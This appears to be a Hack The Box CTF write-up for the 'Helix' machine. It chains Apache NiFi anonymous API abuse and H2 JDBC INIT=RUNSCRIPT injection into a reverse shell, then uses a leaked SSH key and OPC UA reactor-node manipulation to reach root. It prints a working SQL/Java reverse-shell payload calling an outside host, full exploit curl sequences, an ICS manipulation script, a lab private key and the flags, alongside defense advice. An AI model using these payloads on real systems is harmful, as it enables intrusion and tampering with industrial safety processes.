# Helix — Hack The Box Writeup

> A comprehensive guide to exploiting Apache NiFi's H2 JDBC injection vulnerability, lateral movement via SSH, and industrial control system privilege escalation through OPC UA manipulation.

---

## Table of Contents

- [Overview](#overview)
- [Machine Information](#machine-information)
- [Attack Path Summary](#attack-path-summary)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Initial Foothold — NiFi to RCE](#phase-2-initial-foothold--nifi-to-rce)
- [Phase 3: Lateral Movement](#phase-3-lateral-movement)
- [Phase 4: Privilege Escalation via OPC UA](#phase-4-privilege-escalation-via-opc-ua)
- [Flags](#flags)
- [Knowledge Gaps & Deep Dives](#knowledge-gaps--deep-dives)
- [Key Learnings](#key-learnings)

---

## Overview

**Helix** is a multi-stage compromise that combines web application exploitation, industrial control systems (ICS), and privilege escalation. The machine demonstrates:

1. **Configuration abuse** in Apache NiFi leading to RCE
2. **H2 Database JDBC injection** via the INIT parameter
3. **SSH lateral movement** using leaked private keys
4. **OPC UA node manipulation** to bypass safety interlocks and gain root access

The attack chain requires understanding each layer's constraints and working *with* the industrial process logic rather than against it.

---

## Machine Information

| Property | Value |
|----------|-------|
| **Platform** | Hack The Box |
| **Machine Name** | Helix |
| **Difficulty** | Medium |
| **OS** | Ubuntu 22.04.5 LTS |
| **IP Address** | 10.129.116.46 |
| **Primary Hostnames** | `helix.htb`, `flow.helix.htb` |
| **Initial User** | `nifi` |
| **Pivot User** | `operator` |
| **Final User** | `root` |
| **User Flag** | `ce86807b1fd16e4226ff8e7edf0e7823` |
| **Root Flag** | `dd8b161e973fb8814d1bbb6e43f219f6` |

---

## Attack Path Summary

```
┌─────────────────────────────────────────────────────────────┐
│ Port 80 (Nginx) / flow.helix.htb                            │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Apache NiFi 1.21.0 — Anonymous Read/Write API Access       │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ H2 JDBC Connection URL Injection (INIT=RUNSCRIPT)           │
│ Download & Execute Malicious SQL → Java Alias Creation     │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Reverse Shell as nifi user                                  │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Find operator_id_ed25519.bak in NiFi Support Bundles       │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ SSH as operator@helix.htb                                   │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Discover: sudo NOPASSWD: helix-maint-console                │
│ But: Maintenance Window Must Be Open First                  │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Local OPC UA Service (127.0.0.1:4840)                       │
│ SSH Tunnel + Node Manipulation                              │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Set: Mode=MAINTENANCE, TestOverride=True                    │
│ Adjust: CalibrationOffset to 20.0                           │
│ Result: Temperature Crosses Threshold, Trip=False           │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ Maintenance Window Opens (106 second window)                │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ sudo helix-maint-console → Root Shell                       │
└─────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Reconnaissance

### 1.1 Network Scanning

Identify open ports and services:

```bash
nmap -sC -sV 10.129.116.46
nmap -p- --min-rate 5000 10.129.116.46
```

**Key Findings:**
- **Port 22/TCP** — OpenSSH 8.9p1 (SSH)
- **Port 80/TCP** — Nginx 1.18.0 (HTTP)
- **Port 8080/TCP** (localhost) — Apache NiFi (internal)
- **Port 4840/TCP** (localhost) — OPC UA (industrial control)

### 1.2 HTTP Reconnaissance

Visit `http://10.129.116.46` — returns redirect to `http://helix.htb`. Add to `/etc/hosts`:

```bash
echo "10.129.116.46 helix.htb flow.helix.htb" >> /etc/hosts
```

### 1.3 Virtual Host Enumeration

Fuzz for subdomains:

```bash
ffuf -w /usr/share/wordlists/common.txt -u http://helix.htb -H "Host: FUZZ.helix.htb"
```

**Result:** `flow.helix.htb` discovered → Apache NiFi running.

### 1.4 Technology Identification

Verify NiFi version:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about | jq
```

**Output:** Version 1.21.0 (vulnerable to configuration abuse).

### 1.5 Access Control Assessment

Check anonymous access:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/current-user | jq
```

**Critical Finding:** Full anonymous read/write access to controller services, processors, and all restricted components (`execute-code`, `write-filesystem`, etc.).

---

## Phase 2: Initial Foothold — NiFi to RCE

### 2.1 Vulnerability: H2 JDBC Initialization Injection

**What is H2?**
- Lightweight Java SQL database often embedded in applications
- Supports in-memory databases (fast, temporary)
- Allows JDBC URL parameters for advanced config

**The Vulnerability:**
The `INIT` parameter in H2 JDBC URLs can execute SQL scripts on connection:

```
jdbc:h2:mem:DATABASE_NAME;INIT=RUNSCRIPT FROM 'http://attacker.com/payload.sql'
```

When NiFi connects to the database, H2 automatically downloads and executes the SQL file.

**Why It Works Here:**
1. NiFi's `MaintenanceDB` controller service uses H2 as its driver
2. The NiFi API allows anonymous modification of controller service properties
3. The `ExecuteSQL` processor is already configured and uses the service
4. When enabled, it forces a connection, which triggers the INIT script

### 2.2 Crafting the Payload

**Create `payload.sql`** on your Kali machine:

```sql
CREATE ALIAS IF NOT EXISTS EXEC AS $$
String exec(String cmd) throws java.io.IOException {
    java.lang.Runtime.getRuntime().exec(
        new String[]{"/bin/bash", "-c", cmd}
    );
    return "OK";
}
$$;

CALL EXEC('bash -i >& /dev/tcp/10.10.14.4/4444 0>&1');
```

**How it works:**
1. `CREATE ALIAS` binds Java code to a callable SQL function
2. The Java code uses `Runtime.exec()` to run shell commands
3. `CALL EXEC()` executes the reverse shell payload

### 2.3 Hosting the Payload

```bash
# Terminal 1: Start HTTP server
cd ~
python3 -m http.server 8000 --bind 0.0.0.0

# Terminal 2: Start netcat listener
rlwrap nc -lvnp 4444
```

### 2.4 Exploiting NiFi

**Critical Insight:** The payload won't execute if H2 reuses an existing database. Use a **unique database name** with timestamp.

```bash
NIFI='http://flow.helix.htb/nifi-api'
PROC_ID='f4797168-019b-1000-2229-6c29fab7ba7c'
CS_ID='f483dcc4-019b-1000-2dd4-9a275954eb10'

# Step 1: Stop the processor
curl -sS "$NIFI/processors/$PROC_ID" -o /tmp/proc.json
jq '{
  revision: .revision,
  disconnectedNodeAcknowledged: false,
  state: "STOPPED"
}' /tmp/proc.json > /tmp/stop.json
curl -sS -X PUT "$NIFI/processors/$PROC_ID/run-status" \
  -H 'Content-Type: application/json' --data-binary @/tmp/stop.json

# Step 2: Disable controller service
curl -sS "$NIFI/controller-services/$CS_ID" -o /tmp/cs.json
jq '{
  revision: .revision,
  disconnectedNodeAcknowledged: false,
  state: "DISABLED"
}' /tmp/cs.json > /tmp/disable.json
curl -sS -X PUT "$NIFI/controller-services/$CS_ID/run-status" \
  -H 'Content-Type: application/json' --data-binary @/tmp/disable.json

# Step 3: Update JDBC URL with unique database name
curl -sS "$NIFI/controller-services/$CS_ID" -o /tmp/cs.json
DBNAME="shell$(date +%s%N)"
EVIL_URL="jdbc:h2:mem:${DBNAME};INIT=RUNSCRIPT FROM 'http://10.10.14.4:8000/payload.sql'"

jq --arg url "$EVIL_URL" '{
  revision: .revision,
  disconnectedNodeAcknowledged: false,
  component: {
    id: .component.id,
    properties: {
      "Database Connection URL": $url
    }
  }
}' /tmp/cs.json > /tmp/update.json

curl -sS -X PUT "$NIFI/controller-services/$CS_ID" \
  -H 'Content-Type: application/json' --data-binary @/tmp/update.json

# Step 4: Re-enable controller service
curl -sS "$NIFI/controller-services/$CS_ID" -o /tmp/cs.json
jq '{
  revision: .revision,
  disconnectedNodeAcknowledged: false,
  state: "ENABLED"
}' /tmp/cs.json > /tmp/enable.json
curl -sS -X PUT "$NIFI/controller-services/$CS_ID/run-status" \
  -H 'Content-Type: application/json' --data-binary @/tmp/enable.json

# Step 5: Start the processor
curl -sS "$NIFI/processors/$PROC_ID" -o /tmp/proc.json
jq '{
  revision: .revision,
  disconnectedNodeAcknowledged: false,
  state: "RUNNING"
}' /tmp/proc.json > /tmp/start.json
curl -sS -X PUT "$NIFI/processors/$PROC_ID/run-status" \
  -H 'Content-Type: application/json' --data-binary @/tmp/start.json
```

### 2.5 Catching the Shell

You should see:
- **HTTP Server:** `GET /payload.sql HTTP/1.1 200`
- **Netcat:** Connection from `nifi@helix`

```bash
nifi@helix:/opt/nifi-1.21.0$ id
uid=984(nifi) gid=984(nifi) groups=984(nifi)
```

---

## Phase 3: Lateral Movement

### 3.1 Finding the SSH Key

NiFi support bundles are used for debugging. They often contain sensitive backups:

```bash
nifi@helix:/opt/nifi-1.21.0$ find /opt/nifi-1.21.0 -type f -name 'operator_id_ed25519.bak' 2>/dev/null
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak

nifi@helix:/opt/nifi-1.21.0$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

### 3.2 SSH as Operator

On Kali:

```bash
cat > ~/operator_id_ed25519 <<'KEY'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
KEY

chmod 600 ~/operator_id_ed25519
ssh -i ~/operator_id_ed25519 -o IdentitiesOnly=yes operator@helix.htb
```

### 3.3 Privilege Check

```bash
operator@helix:~$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

**The Gate:** `helix-maint-console` requires a maintenance window to be open. Try running it — it will fail with "Maintenance window CLOSED."

### 3.4 User Flag

```bash
operator@helix:~$ cat user.txt
ce86807b1fd16e4226ff8e7edf0e7823
```

---

## Phase 4: Privilege Escalation via OPC UA

### 4.1 Discovering the OPC UA Service

From `operator@helix`, check listening ports:

```bash
ss -tulnp | grep LISTEN
```

You'll see `127.0.0.1:4840` — this is the OPC UA service (bound to localhost only, hence why we need SSH).

### 4.2 OPC UA Fundamentals

**What is OPC UA?**
- **OPC UA** = Open Platform Communications Unified Architecture
- Industry standard for industrial control systems (ICS/SCADA)
- Uses a hierarchical node tree with Node IDs
- Each node can be a variable (readable/writable) or object (container)

**Structure for Helix:**
```
Plant
├── Reactor
│   ├── TemperatureRaw (ns=2;i=3)
│   ├── Temperature (ns=2;i=4)
│   ├── Pressure (ns=2;i=5)
│   └── CalibrationOffset (ns=2;i=6)
├── Safety
│   ├── RodsInserted (ns=2;i=8)
│   ├── EmergencyCooling (ns=2;i=9)
│   └── TripActive (ns=2;i=10) [Read-only]
└── Control
    ├── Mode (ns=2;i=12)
    ├── TestOverride (ns=2;i=13)
    └── ResetTrip (ns=2;i=14)
```

### 4.3 The Safety Interlock Logic

**Process Physics:**
```
Temperature = TemperatureRaw + CalibrationOffset
```

**Safety Logic:**
- If `Temperature > ~305°C` → `TripActive = True` (automatic shutdown)
- When `TripActive = True` → `helix-maint-console` cannot run
- **Goal:** Raise temperature to trigger maintenance mode *without* triggering the safety trip

**Maintenance Window Condition:**
- `Mode = "MAINTENANCE"`
- `TestOverride = True`
- `Temperature` crosses threshold (~304°C) without `TripActive` firing
- Window expires in ~106 seconds

### 4.4 SSH Tunnel to OPC UA

Set up port forwarding to access the local OPC UA service:

```bash
# Terminal 1: Keep SSH tunnel open
ssh -i ~/operator_id_ed25519 -o IdentitiesOnly=yes \
  -L 4840:127.0.0.1:4840 operator@helix.htb
```

This exposes `localhost:4840` on your Kali machine.

### 4.5 OPC UA Exploitation Script

Install the OPC UA library:

```bash
python3 -m venv ~/opc_venv
source ~/opc_venv/bin/activate
pip install opcua
```

Run the exploit:

```python
import time
from opcua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

NODES = {
    "raw": "ns=2;i=3",
    "temp": "ns=2;i=4",
    "offset": "ns=2;i=6",
    "rods": "ns=2;i=8",
    "cooling": "ns=2;i=9",
    "trip": "ns=2;i=10",
    "mode": "ns=2;i=12",
    "override": "ns=2;i=13",
    "reset": "ns=2;i=14",
}

client = Client(URL, timeout=5)

def read(name):
    return client.get_node(NODES[name]).get_value()

def write(name, value, variant_type, delay=0.4):
    client.get_node(NODES[name]).set_value(ua.Variant(value, variant_type))
    time.sleep(delay)

try:
    client.connect()
    print("[+] Connected to OPC UA")

    # Reset to safe baseline
    write("offset", 0.0, ua.VariantType.Double)
    write("mode", "NORMAL", ua.VariantType.String)
    write("override", False, ua.VariantType.Boolean)
    time.sleep(1)

    # Reset trip pulse
    write("reset", True, ua.VariantType.Boolean, 0.6)
    write("reset", False, ua.VariantType.Boolean)
    time.sleep(1)

    # Enter maintenance mode
    print("[*] Entering maintenance mode...")
    write("override", True, ua.VariantType.Boolean)
    write("mode", "MAINTENANCE", ua.VariantType.String)

    # Set offset to safe level (20.0 = ~304°C, trip=False)
    write("offset", 20.0, ua.VariantType.Double, 1.0)

    temp = read("temp")
    trip = read("trip")
    print(f"[+] State: temp={temp:.1f}, trip={trip}")
    print("[+] MAINTENANCE WINDOW OPEN!")
    print("[+] Running: sudo /usr/local/sbin/helix-maint-console")
    print("[+] Keeping connection alive...")

    # Maintain the state
    while True:
        time.sleep(2)
        write("offset", 20.0, ua.VariantType.Double, 0.2)
        print(f"[*] State maintained... trip={read('trip')}")

except KeyboardInterrupt:
    print("\n[*] Disconnecting")
finally:
    try:
        client.disconnect()
    except:
        pass
```

### 4.6 Root Shell

Keep the Python script running, then in your SSH session:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 106 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# cat /root/root.txt
dd8b161e973fb8814d1bbb6e43f219f6
```

---

## Flags

| Type | Flag |
|------|------|
| **User** | `ce86807b1fd16e4226ff8e7edf0e7823` |
| **Root** | `dd8b161e973fb8814d1bbb6e43f219f6` |

---

## Knowledge Gaps & Deep Dives

### K1: Why Does H2 INIT Execute Arbitrary SQL?

**The Design:**
H2 was built for rapid Java application development. The `INIT` parameter allows database initialization scripts to run automatically on first connection, useful for seeding data or setting up schemas.

**The Flaw:**
If an attacker can control the JDBC URL, they can supply a malicious SQL script URL. H2 doesn't validate the SQL source — it just downloads and runs it.

**Real-world Lesson:**
Never allow users to control database connection strings, even partially.

### K2: Why Must Database Names Be Unique?

**H2's Caching:**
H2 caches in-memory databases by name. If you use `jdbc:h2:mem:maint` twice, the second connection reuses the existing database and *skips* the INIT script.

**Why This Matters:**
If the target's original JDBC URL already initialized the database with `db:h2:mem:maint`, your injection won't work unless you use a new name.

**Exploit Implication:**
Always use `jdbc:h2:mem:{unique_name}` with a timestamp to guarantee fresh initialization.

### K3: How Does NiFi's Revision System Work?

**Optimistic Locking:**
Every NiFi component (processor, service, connection) has a `revision.version` number. Before modifying anything, you must include the current version.

**Why:**
Prevents race conditions and ensures you're modifying the *current* state, not an outdated copy.

**Exploitation Pattern:**
1. Fetch component → read revision
2. Modify component → include that revision
3. API returns new revision
4. Next modification must use new revision

### K4: OPC UA Node Access Levels

**Access Level Encoding:**
- `1` = CurrentRead (readable only)
- `2` = CurrentWrite (writable only)
- `3` = CurrentRead | CurrentWrite (both)

**Helix Nodes:**
- `TripActive` (ns=2;i=10) has level `1` → read-only, cannot be forced to False
- `Mode`, `TestOverride`, `CalibrationOffset` have level `3` → writable
- Safety system automatically *computes* `TripActive` based on logic, not user writes

**Key Insight:**
You can't bypass the trip by writing `TripActive=False`. You must satisfy the *actual process logic* to avoid triggering it.

### K5: The Maintenance Window Timeout

**How It Works:**
When the PLC detects that the process reached the maintenance threshold (temperature crossed 304°C while `Mode=MAINTENANCE` and `TestOverride=True` and `TripActive=False`), it writes a flag file `/opt/helix/state/maintenance_window` with a timestamp.

**The Window:**
- Duration: 106 seconds
- Expires: Automatically at timeout
- `helix-maint-console` checks this file before granting root access

**Why It's Critical:**
If your OPC UA connection drops, the state reverts and the window closes within 106 seconds. You must **keep the connection alive** while you run `sudo helix-maint-console`.

---

## Key Learnings

### Security Principles Violated (Lesson 1: Configuration as Attack Surface)

**What Went Wrong:**
- Exposed NiFi API with anonymous write access
- Allowed modification of database connection strings
- No validation of JDBC URL structure

**Best Practice:**
- Restrict NiFi API to authenticated users
- Use allowlists for JDBC URLs (only specific patterns)
- Separate application config from runtime data

### Security Principles Violated (Lesson 2: Defense in Depth)

**What Happened:**
- Even after SSH access as `operator`, you still couldn't run `helix-maint-console`
- The application enforced *its own* business logic (maintenance window)
- Multiple layers of checks (access control + state validation)

**Takeaway:**
Industrial systems combine:
1. OS-level access control (sudo)
2. Application-level state checks (maintenance window)
3. Physical process logic (PLC safety interlocks)

Attacking one layer isn't enough; you must satisfy *all* layers.

### Attacking Industrial Systems (Lesson 3: Process Logic as Defense)

**Key Insight:**
Industrial control systems are designed with *safety interlocks* — automatic shutdown triggers to prevent dangerous conditions (overheat, over-pressure, etc.).

**The Attack:**
Rather than *disable* the interlock, work within the process logic to reach a safe maintenance state.

**Process Understanding Required:**
- Know the sensor equations (`Temperature = Raw + Offset`)
- Know the trip thresholds (~305°C)
- Know the maintenance conditions (Mode + Override + Threshold crossing + No trip)
- Manipulate inputs to satisfy all conditions

**Real-world Implication:**
Attacking SCADA systems requires deep understanding of the actual *process*, not just the software.

### Technical Debt (Lesson 4: Support Bundles and Backups)

**The Mistake:**
`operator_id_ed25519.bak` was included in NiFi's support bundles — a diagnostic output meant for debugging that accidentally exposed credentials.

**Why It Happened:**
- Support bundles automatically collect files from well-known directories
- Developers might leave backup keys as `.bak` for "safety"
- No filtering of sensitive file patterns

**Best Practice:**
- Never include private keys in support bundles
- Rotate credentials periodically
- Audit what diagnostic tools expose

---

## Exploitation Timeline

| Phase | Action | User | Result |
|-------|--------|------|--------|
| **Recon** | Port scan → NIFI discovery | Unauthenticated | Identified NiFi 1.21.0 with anonymous API access |
| **Exploit** | H2 JDBC injection + INIT=RUNSCRIPT | Unauthenticated | RCE as `nifi` user |
| **Post-Exploit** | Find operator SSH key in support-bundles | `nifi` | Lateral movement possible |
| **Lateral Move** | SSH as operator using private key | `nifi` → `operator` | User flag captured |
| **Priv Esc** | OPC UA state manipulation | `operator` | Maintenance window opened |
| **Root Access** | helix-maint-console with window open | `operator` | Root shell spawned |

---

## Defense Recommendations

| Vulnerability | Fix |
|---|---|
| Anonymous NiFi API access | Require authentication; implement role-based access control |
| H2 JDBC injection | Validate/allowlist connection URL parameters; use connection pooling config files |
| SSH keys in support bundles | Filter sensitive files; rotate keys regularly; use SSH agent forwarding |
| Hardcoded maintenance window logic | Implement multi-factor authorization; require physical key/badge for maintenance |
| Exposed OPC UA service | Bind to loopback only; implement OPC UA security policies; require user authentication |
| Process logic as sole defense | Add independent safety interlocks; separate control logic from protection logic |

---

## Final Thoughts

**Helix demonstrates that modern attacks on industrial systems are *layered*:**

1. Start with web application misconfig (NiFi API)
2. Exploit database drivers (H2 JDBC)
3. Leverage operational procedures (SSH key in support bundle)
4. Manipulate process state (OPC UA nodes)
5. Satisfy application logic (maintenance window)

**The lesson:** Understanding *why* each layer exists and working with (not against) the system logic makes complex exploits achievable.

---

**Author Notes:** This machine is an excellent representation of real-world ICS/OT environments where IT security, software security, and process safety must all be considered. Great learning experience!
